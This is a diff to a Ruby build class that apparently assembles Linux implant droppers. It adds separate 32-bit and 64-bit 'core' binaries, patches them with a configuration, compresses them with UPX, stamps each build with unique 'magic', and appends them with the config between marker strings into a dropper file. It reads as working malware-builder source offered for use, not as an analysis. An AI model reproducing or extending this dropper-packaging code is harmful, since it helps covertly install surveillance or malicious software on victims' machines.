@@ -22,7 +22,7 @@ class BuildLinux < Build
 
     # add the file to be patched to the params
     # these params will be passed to the super
-    params[:core] = 'core'
+    params[:core] = 'core32'
     params[:config] = 'config'
 
     # enforce demo flag accordingly to the license
@@ -35,8 +35,13 @@ class BuildLinux < Build
     # invoke the generic patch method with the new params
     super
 
+    # patch the core64
+    params[:core] = 'core64'
+    params[:config] = nil
+    super
+
     # pack the core
-    CrossPlatform.exec path('bin/upx'), "-q --no-color --ultra-brute #{path('core')}"
+    CrossPlatform.exec path('bin/upx'), "-q --no-color --ultra-brute #{path('core32')} #{path('core64')}"
   end
 
   def melt(params)
@@ -58,10 +63,12 @@ class BuildLinux < Build
     File.open(path('dropper'), "ab") do |f|
       f.write DROPPER_MARKER
       f.write scramble_dir
-      f.write [File.size(path('core'))].pack('I')
-      f.write File.binread(path('core'))
       f.write [File.size(path('config'))].pack('I')
       f.write File.binread(path('config'))
+      f.write [File.size(path('core32'))].pack('I')
+      f.write File.binread(path('core32'))
+      f.write [File.size(path('core64'))].pack('I')
+      f.write File.binread(path('core64'))
       f.write DROPPER_MARKER
       f.write [dropper_size].pack('I')
     end
@@ -142,14 +149,18 @@ class BuildLinux < Build
 
   def unique(core)
     Zip::ZipFile.open(core) do |z|
-      core_content = z.file.open('core', "rb") { |f| f.read }
+      core_content = z.file.open('core32', "rb") { |f| f.read }
       add_magic(core_content)
-      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
+      File.open(Config.instance.temp('core32'), "wb") {|f| f.write core_content}
+
+      core_content = z.file.open('core64', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('core64'), "wb") {|f| f.write core_content}
     end
 
     # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
-    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
-    FileUtils.rm_rf Config.instance.temp('core')
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core32')} #{Config.instance.temp('core64')}"
+    FileUtils.rm_rf Config.instance.temp(['core32', 'core64'])
   end
 
 end
